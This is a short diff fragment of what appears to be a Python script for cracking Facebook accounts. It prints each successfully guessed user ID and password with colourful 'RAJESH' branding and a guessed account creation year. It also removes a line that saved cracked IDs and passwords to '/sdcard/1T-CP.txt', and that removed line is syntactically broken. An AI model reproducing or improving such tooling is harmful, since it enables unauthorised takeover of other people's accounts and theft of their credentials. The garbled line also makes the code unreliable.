@@ -400,7 +400,6 @@ try:
                 if 'session_key' in str(po):
                     print(f"\r\r\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                     
-                if 'open('/sdcard/1T-CP.txt', 'a').write(iid + ' | ' + psw + ' | ' + id + '\n')
                 break
             else:pass
     lop += 1
